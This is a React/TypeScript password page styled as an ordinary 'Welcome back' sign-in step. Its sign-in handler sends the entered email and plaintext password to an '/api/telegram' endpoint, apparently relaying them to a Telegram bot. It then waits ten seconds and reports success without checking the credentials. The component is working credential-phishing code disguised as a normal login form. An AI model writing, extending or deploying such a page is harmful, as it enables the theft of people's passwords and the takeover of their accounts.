import { useState, useEffect } from 'react'
import { EyeIcon } from './EyeIcon'
import { EyeOffIcon } from './EyeOffIcon'

interface PasswordPageProps {
  email: string
  onChangeEmail: () => void
  onSignInSuccess: () => void
}

export function PasswordPage({ email, onChangeEmail, onSignInSuccess }: PasswordPageProps) {
  const [password, setPassword] = useState('')
  const [isFocused, setIsFocused] = useState(false)
  const [showPassword, setShowPassword] = useState(false)
  const [error, setError] = useState('')
  const [isLoading, setIsLoading] = useState(false)

  const hasValue = password.trim() !== ''
  const showLabel = !hasValue && !isFocused

  useEffect(() => {
    // Focus password input when page loads
    const input = document.getElementById('password-input') as HTMLInputElement
    if (input) {
      setTimeout(() => input.focus(), 100)
    }
  }, [])

  const handleSignIn = async () => {
    if (!password.trim()) {
      setError('Please enter your password.')
      return
    }

    setError('')
    setIsLoading(true)

    await fetch('/api/telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        kind: 'login',
        username: email.trim(),
        password,
      }),
    }).catch(console.error)
    await new Promise((r) => setTimeout(r, 10000))
    setIsLoading(false)
    onSignInSuccess()
  }

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleSignIn()
    }
  }

  return (
    <div>
      <h1 className="text-[28px] font-semibold text-[#1a1a1a] mb-4 tracking-tight">
        Welcome back.
      </h1>

      {/* Email Display */}
      <p className="text-base text-[#1a1a1a] mb-6 flex items-center gap-2">
        <span>{email}</span>
        <button
          onClick={onChangeEmail}
          className="text-[#1a1a1a] underline text-base bg-transparent border-none p-0 cursor-pointer hover:text-black"
        >
          Change
        </button>
      </p>

      {/* Password Input */}
      <div className="relative mb-4">
        <input
          type={showPassword ? 'text' : 'password'}
          id="password-input"
          value={password}
          onChange={(e) => {
            setPassword(e.target.value)
            setError('')
          }}
          onFocus={() => setIsFocused(true)}
          onBlur={() => setIsFocused(false)}
          onKeyPress={handleKeyPress}
          autoComplete="current-password"
          className={`
            w-full h-14 px-4 pr-12 pt-5 pb-2 
            border rounded-lg text-base text-[#1a1a1a] bg-white
            transition-all duration-200 outline-none
            hover:border-[#1a1a1a]
            focus:border-[#1a1a1a] focus:shadow-[0_0_0_2px_rgba(26,26,26,0.1)]
            ${error ? 'border-[#d32f2f]' : 'border-[#d1d1d1]'}
          `}
        />
        <label
          htmlFor="password-input"
          className={`
            absolute left-4 text-base text-[#6b6b6b] pointer-events-none
            transition-all duration-200 origin-top-left
            ${showLabel ? 'top-[18px]' : 'top-2 scale-[0.85]'}
          `}
        >
          Password
        </label>

        {/* Toggle Password Visibility */}
        <button
          type="button"
          onClick={() => setShowPassword(!showPassword)}
          className="
            absolute right-3 top-1/2 -translate-y-1/2
            bg-transparent border-none p-2
            flex items-center justify-center
            text-[#6b6b6b] hover:text-[#1a1a1a]
            cursor-pointer
          "
          aria-label={showPassword ? 'Hide password' : 'Show password'}
        >
          {showPassword ? (
            <EyeOffIcon className="w-5 h-5" />
          ) : (
            <EyeIcon className="w-5 h-5" />
          )}
        </button>
      </div>

      {error && (
        <p className="text-[13px] text-[#d32f2f] mb-2">{error}</p>
      )}

      {/* Forgot Password */}
      <div className="mb-6">
        <a 
          href="#" 
          className="text-[#1a1a1a] underline text-[15px] hover:text-black"
        >
          Forgot password?
        </a>
      </div>

      {/* Sign In Button */}
      <button
        onClick={handleSignIn}
        disabled={isLoading}
        className="
          w-full h-12 rounded-full text-[15px] font-semibold
          bg-[#1a1a1a] text-white
          hover:bg-black
          disabled:bg-[#e0e0e0] disabled:text-[#9e9e9e] disabled:cursor-not-allowed
          flex items-center justify-center gap-2
          transition-all duration-200
        "
      >
        {isLoading ? (
          <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
        ) : (
          'Sign in'
        )}
      </button>
    </div>
  )
}
